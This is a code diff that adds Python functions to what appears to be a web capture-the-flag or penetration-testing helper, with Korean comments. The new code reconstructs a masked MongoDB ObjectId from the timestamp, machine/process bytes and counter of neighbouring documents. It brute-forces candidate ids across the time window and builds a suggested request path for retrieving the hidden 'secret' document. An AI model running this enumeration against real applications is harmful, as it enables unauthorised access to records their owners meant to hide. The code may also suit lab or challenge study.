@@ -542,3 +542,111 @@ def diff_http_responses(body1: str, body2: str, label1: str = "요청 1", label2
     meaningful_diff = [line for line in diff_lines if line.startswith(("+", "-")) and not line.startswith(("+++", "---"))]
     summary.extend("  " + l for l in meaningful_diff[:25])
     return "\n".join(summary)
+
+
+# =====================================================================
+# 5. Web: MongoDB ObjectId Sequence Analysis & Prediction (MongoDB < 4.0.0)
+# =====================================================================
+
+def predict_mongodb_objectids(data_str: str) -> list[str]:
+    """
+    Analyzes a list of MongoDB documents/JSON to predict hidden/missing ObjectIds.
+    In MongoDB (< 4.0.0 and BSON 12-byte format):
+    - 4 bytes: Unix timestamp (big-endian seconds)
+    - 5 bytes: Machine identifier + Process ID (shared across same node.js process)
+    - 3 bytes: Incrementing counter (strictly sequential)
+    """
+    import json
+    import re
+    from datetime import datetime
+
+    try:
+        items = json.loads(data_str)
+    except Exception:
+        m = re.search(r"\[\s*\{.*\}\s*\]", data_str, re.DOTALL)
+        if m:
+            try:
+                items = json.loads(m.group(0))
+            except Exception:
+                items = []
+        else:
+            items = []
+
+    candidates = []
+
+    if isinstance(items, list):
+        valid_entries = []
+        for i, it in enumerate(items):
+            if isinstance(it, dict):
+                oid = it.get("_id")
+                date_str = it.get("publish_date") or it.get("created_at") or it.get("date") or it.get("createdAt")
+                valid_entries.append((i, oid, str(date_str) if date_str else None, it))
+
+        for idx, (i, oid, date_str, it) in enumerate(valid_entries):
+            if oid is None:
+                prev_entry = next((e for e in reversed(valid_entries[:idx]) if e[1] and len(str(e[1])) == 24), None)
+                next_entry = next((e for e in valid_entries[idx+1:] if e[1] and len(str(e[1])) == 24), None)
+
+                if prev_entry and next_entry:
+                    prev_id = str(prev_entry[1])
+                    next_id = str(next_entry[1])
+
+                    p_ts = int(prev_id[:8], 16)
+                    p_mid = prev_id[8:18]
+                    p_cnt = int(prev_id[18:], 16)
+
+                    n_ts = int(next_id[:8], 16)
+                    n_mid = next_id[8:18]
+                    n_cnt = int(next_id[18:], 16)
+
+                    if p_mid == n_mid and n_cnt > p_cnt:
+                        target_cnt = p_cnt + 1
+                        mid_hex = p_mid
+
+                        exact_ts = None
+                        if date_str and prev_entry[2]:
+                            try:
+                                dt_curr = datetime.fromisoformat(date_str.replace("Z", "+00:00"))
+                                dt_prev = datetime.fromisoformat(prev_entry[2].replace("Z", "+00:00"))
+                                diff_sec = int(round(dt_curr.timestamp() - dt_prev.timestamp()))
+                                exact_ts = p_ts + diff_sec
+                            except Exception:
+                                pass
+
+                        if exact_ts and p_ts <= exact_ts <= n_ts:
+                            predicted = f"{exact_ts:08x}{mid_hex}{target_cnt:06x}"
+                            candidates.append(predicted)
+
+                        for ts in range(p_ts, n_ts + 1):
+                            cand = f"{ts:08x}{mid_hex}{target_cnt:06x}"
+                            if cand not in candidates:
+                                candidates.append(cand)
+
+    return candidates
+
+
+def analyze_mongodb_objectids(data_str: str, endpoint_template: str = "") -> str:
+    """
+    Generates a comprehensive diagnostic report for MongoDB ObjectId prediction.
+    """
+    candidates = predict_mongodb_objectids(data_str)
+    if not candidates:
+        return "MongoDB ObjectId 패턴(은닉된 _id: null 및 전후 연속성)을 감지하지 못했습니다."
+
+    top_cand = candidates[0]
+    lines = [
+        "[MongoDB ObjectId 연속성 분석 (MongoDB < 4.0.0 취약점)]:",
+        f"- 비밀 문서의 _id가 null로 마스킹되어 있으나, 동일 프로세스의 전후 문서로부터 ObjectId가 유일하게 복원되었습니다.",
+        f"- 식별된 머신/프로세스 ID: {top_cand[8:18]}",
+        f"- 추정된 순차 카운터: {top_cand[18:]}",
+        f"- 1순위 예측 ObjectId: {top_cand}",
+    ]
+    if len(candidates) > 1:
+        lines.append(f"- 전체 후보 ObjectId ({len(candidates)}개): {', '.join(candidates[:8])}")
+
+    if endpoint_template:
+        suggested = endpoint_template.replace("<OID>", top_cand).replace(":board_id", top_cand)
+        lines.append(f"- 권장 요청 경로: {suggested}")
+
+    lines.append("\n[취약점 해설]: MongoDB < 4.0.0에서는 ObjectId가 [4B Unix Time | 3B Machine | 2B Process | 3B Counter]로 구성되어 연속 생성된 문서의 ID를 오차 없이 역추적할 수 있습니다.")
+    return "\n".join(lines)
